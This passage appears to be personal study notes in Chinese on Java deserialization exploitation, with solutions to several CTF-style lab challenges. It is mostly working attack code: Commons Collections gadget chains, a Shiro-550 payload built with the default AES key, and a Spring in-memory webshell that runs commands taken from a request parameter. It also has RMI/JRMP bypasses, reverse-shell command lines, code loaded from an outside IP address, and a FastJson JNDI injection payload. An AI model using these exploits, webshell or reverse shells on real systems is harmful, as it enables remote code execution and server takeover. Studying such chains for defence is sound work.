        String b64str = "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgAxb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5UcmFuc2Zvcm1lZE1hcGF3P+Bd8VpwAwACTAAOa2V5VHJhbnNmb3JtZXJ0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO0wAEHZhbHVlVHJhbnNmb3JtZXJxAH4ABXhwcHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXR0ABJMamF2YS9sYW5nL1N0cmluZztMAAtfYXV4Q2xhc3Nlc3QAO0xjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9IYXNodGFibGU7WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+ABBMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////AHQAA2FsbHB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAGPMr+ur4AAAAzAD0KAAoAJAkAJQAmCAAnCgAoACkKACoAKwgALAoAKgAtBwAuBwAvBwAwAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABlMZXZpbC9IZWxsb1RlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHADEBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHAC8HAC4BAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMAB0AHgcAMgwAMwA0AQATSGVsbG8gVGVtcGxhdGVzSW1wbAcANQwANgA3BwA4DAA5ADoBAAhjYWxjLmV4ZQwAOwA8AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAF2V2aWwvSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAJAAoAAAAAAAMAAQALAAwAAgANAAAAPwAAAAMAAAABsQAAAAIADgAAAAYAAQAAAAoADwAAACAAAwAAAAEAEAARAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQALABgAAgANAAAASQAAAAQAAAABsQAAAAIADgAAAAYAAQAAAAwADwAAACoABAAAAAEAEAARAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAEAHQAeAAEADQAAAHYAAgACAAAAGiq3AAGyAAISA7YABLgABRIGtgAHV6cABEyxAAEADAAVABgACAADAA4AAAAaAAYAAAAOAAQADwAMABEAFQAUABgAEgAZABYADwAAAAwAAQAAABoAEAARAAAAHwAAABAAAv8AGAABBwAgAAEHACEAAAEAIgAAAAIAI3B0ABJIZWxsb1RlbXBsYXRlc0ltcGxwdwEAeHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXEAfgAQWwALaVBhcmFtVHlwZXNxAH4AE3hwcHQADm5ld1RyYW5zZm9ybWVycHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAFdmFsdWV0AAR4eHh4eHh2cgAeamF2YS5sYW5nLmFubm90YXRpb24uUmV0ZW50aW9uAAAAAAAAAAAAAAB4cA==";
        BASE64Decoder b64 = new BASE64Decoder();
        byte[] bytes = b64.decodeBuffer(b64str);
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
        in.readObject();
    }
}
```

不使用InvokerTransformer

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(
                new Class[] { Templates.class },
                new Object[] { templatesImplObj })
};
```

#### shiro 550

tomcat9以上不支持java1.7jre，改用tomcat8

```java
package com.sec.test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.util.ByteSource;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import org.apache.shiro.crypto.AesCipherService;

public class CommonCollectionsAllKillShiro {
    public static void main(String[] args) throws Exception {
        BASE64Decoder base64Decoder = new BASE64Decoder();
        byte[] code = base64Decoder.decodeBuffer(CommonCollections1.getClassBytes(evil.HelloTemplatesImpl.class));
		
        //TemplatesImpl对象
        TemplatesImpl templatesImplObj = new TemplatesImpl();
        CommonCollections1.setFieldValue(templatesImplObj, "_bytecodes", new byte[][] {code});
        CommonCollections1.setFieldValue(templatesImplObj, "_name", "HelloTemplatesImpl");
        CommonCollections1.setFieldValue(templatesImplObj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("getClass", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,templatesImplObj);

        Map expMap = new HashMap();
        expMap.put(tiedMapEntry,"value");
		//outerMap.remove("key");
        outerMap.clear();

        CommonCollections1.setFieldValue(transformer, "iMethodName", "newTransformer");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(expMap);
        objectOutputStream.close();

        byte[] payloads = byteArrayOutputStream.toByteArray();
        AesCipherService aes = new AesCipherService();

        BASE64Decoder b64 = new BASE64Decoder();
        byte[] key = b64.decodeBuffer("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());

    }
}
```

### 加载字节码

类不用包，否则报找不到类

```
URL[] urls = {new URL("http://101.43.57.52:11012/")};
URLClassLoader loader = URLClassLoader.newInstance(urls);
Class c = loader.loadClass("SqlI");
c.newInstance();
```

## 5 javaDeserializeLabs

### Lab1

直接修改Calc类的属性然后序列化他再编码即可

命令执行exec:

```bash
bash -c {echo,base64encode}|{base64,-d}|{bash,-i}
```

### Lab2

cc6改一下注意writeInt和writeUTF的顺序

```java
package com.test;

import com.yxxx.javasec.deserialize.Utils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author L1ao
 * @version 1.0
 */
public class Main {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{
                new ConstantTransformer(1)
        };
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] { String.class, Class[].class },
                        new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke",
                        new Class[] { Object.class, Object[].class },
                        new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class },
                        new String[] {"calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);


        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"key");

        Map expMap = new HashMap();
        expMap.put(tiedMapEntry,"value");

        outerMap.remove("key");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeUTF("SJTU");
        objectOutputStream.writeInt(1896);
        objectOutputStream.writeObject(expMap);
        System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
//        Object o = (Object)ois.readObject();
    }
}
```

### Lab3

上一个payload报：java.lang.ClassNotFoundException: [Lorg.apache.commons.collections.Transformer;

读安全漫谈的时候说会过滤Transformer的数组，用TiedMapEntry绕过即可

报错：java.io.StreamCorruptedException: invalid type code: CA

还是年轻

具体什么原因呢？这里通过报错的堆栈来进行跟随即可，可以发现在反序列化TemplatesImpl出现了问题，调试发现在反序列化TemplatesImpl的时候，相关属性存在数组，所以同样会触发数组反序列化的问题，所以这里的话TemplatesImpl同样不可取了

RMI二次反序列化绕过，解同lab4

### lab4

[https://blog.csdn.net/mole_exp/article/details/123992395](https://blog.csdn.net/mole_exp/article/details/123992395)

#### 内存马 spring 2.*

```java
package com.test;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

/**
 * 适用于 SpringMVC+Tomcat的环境，以及Springboot 2.x 环境.
 *   因此比 SpringControllerMemShell.java 更加通用
 *   Springboot 1.x 和 3.x 版本未进行测试
 */
public class SpringControllerMemShell2 extends AbstractTranslet {

    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {}

    public SpringControllerMemShell2() {
        try {
            System.out.println("bbnn");
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config =
                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = SpringControllerMemShell2.class.getMethod("test");
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = RequestMappingInfo.paths("/malicious")
                    .options(config)
                    .build();
            SpringControllerMemShell2 springControllerMemShell = new SpringControllerMemShell2("aaa");
            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);
        } catch (Exception e) {

        }
    }

    public SpringControllerMemShell2(String aaa) {
    }

    public void test() throws IOException {
        System.out.println("nnmm");
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        try {
            String arg0 = request.getParameter("cmd");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            } else {
                response.sendError(404);
            }
        } catch (Exception e) {
        }
    }
}
```

反序列化

```java
package com.test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.*;
import java.util.*;

public class Lab4_RMIConnector_self {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    private static byte[] getClassBytes(Class<?> clazz) throws Exception {
        String className = clazz.getName().replace('.', '/') + ".class";
        URL classUrl = clazz.getClassLoader().getResource(className);
        try (InputStream in = classUrl.openStream(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[4096];
            int n;
            while ((n = in.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            byte[] classBytes = out.toByteArray();
            return classBytes;
        }
    }

    public static String getObject() throws Exception {
        byte[] code = getClassBytes(SpringControllerMemShell2.class);
        TemplatesImpl templatesImplObj = new TemplatesImpl();
        setFieldValue(templatesImplObj, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImplObj, "_name", "Evil");
        setFieldValue(templatesImplObj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(templatesImplObj),
                new InvokerTransformer("newTransformer",null,null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
//                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
//                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
//        };
        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test1");

        HashSet hashSet = new HashSet(1);
        hashSet.add(tiedMapEntry);

        lazyMap.remove("test1");

        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
        setFieldValue(chainedTransformer, "iTransformers", transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashSet);

        return Base64.getEncoder().encodeToString(barr.toByteArray());
    }

    public static void main(String[] args) throws Exception {
        RMIConnector connector = new RMIConnector(new JMXServiceURL("service:jmx:iiop://127.0.0.1:8000/stub/{$payload}".replace("{$payload}", getObject())), null);

        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

        Map<Object,Object> lazyMap = LazyMap.decorate(new HashMap<>(), new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, connector);

        HashMap expMap = new HashMap();
        expMap.put(tiedMapEntry, "test");
        lazyMap.remove(connector);
        setFieldValue(lazyMap,"factory", invokerTransformer);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeUTF("SJTU");
        objectOutputStream.writeInt(1896);
        objectOutputStream.writeObject(expMap);
        String s = bytesTohexString(byteArrayOutputStream.toByteArray());
        System.out.println(s);

    }
    public static String bytesTohexString(byte[] bytes) {
        if (bytes == null) {
            return null;
        }
        StringBuilder ret = new StringBuilder(2 * bytes.length);
        for (int i = 0; i < bytes.length; i++) {
            int b = 15 & (bytes[i] >> 4);
            ret.append("0123456789abcdef".charAt(b));
            int b2 = 15 & bytes[i];
            ret.append("0123456789abcdef".charAt(b2));
        }
        return ret.toString();
    }
}
```

### lab5

利用MarshalledObject 的 readResolve 来二次反序列化绕过blacklist

### lab6

修复方式与cve的补丁极其相似，绕过即可

参考：[https://y4er.com/posts/weblogic-jrmp/](https://y4er.com/posts/weblogic-jrmp/)

```java
package com.yxxx.javasec.deserialize;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.rmi.server.ObjID;
import java.util.Random;

/**
 * @author L1ao
 * @version 1.0
 */
public class JRMPClient {
    public static void main(String[] args) throws Exception {
        ObjID id = new ObjID((new Random()).nextInt());
        TCPEndpoint te = new TCPEndpoint("ip", 38080);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeUTF("SJTU");
        objectOutputStream.writeInt(1896);
        objectOutputStream.writeObject(ref);
        System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));
    }
}
```

```
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 38080 CommonsCollections6 "bash -c {echo,base64encode}|{base64,-d}|{bash,-i}"
```

### lab7

javax.management.BadAttributeValueExpException

不知道怎么绕

### lab8

## 5 FastJson

```
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
JSON.parseObject(payload, Feature.SupportNonPublicField);

需要开启 Feature.SupportNonPublicFiel

JdbcRowSetImpl 利⽤链配合JDNI 注入


绕过补丁：L; LL;; [ MyBatis java.lang.Class 利⽤链，利⽤缓存 mappings
```

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://101.43.57.52:11012/#Exploit


jdk高版本，
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://101.43.57.52:1099/Exploit\", \"autoCommit\":true}";
        JSON.parse(PoC);
```

```
BadAttributeValueExpException
	JSONArray
		JSON:toString
			JSON:toJSONString
				getOutputProperties
					RCE
```

## JNDI
